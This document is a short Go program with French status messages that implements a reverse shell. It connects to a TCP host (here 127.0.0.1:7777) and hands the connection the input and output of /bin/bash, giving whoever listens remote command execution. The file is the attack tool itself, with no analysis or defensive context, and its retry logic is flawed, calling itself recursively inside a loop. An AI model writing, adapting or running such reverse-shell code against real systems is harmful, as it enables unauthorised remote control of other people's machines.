package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func shell(host string) {

	conn, err := net.Dial("tcp", host)
	if err != nil {
		if nil != conn {
			conn.Close()
		}
		for i := 1; i <= 5; i++ {
			fmt.Println("ERREUR - Connexion a l'hote impossible")
			time.Sleep(5 * time.Second)
			shell(host)
		}
		fmt.Println("ECHEC - Connexion a l'hote impossible")
		os.Exit(1)
	}
	fmt.Println("Connexion Reussie")
	sh := exec.Command("/bin/bash")
	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
	sh.Run()
	conn.Close()
	fmt.Println("Connexion Fermee")

}

func main() {

	shell("127.0.0.1:7777")

}
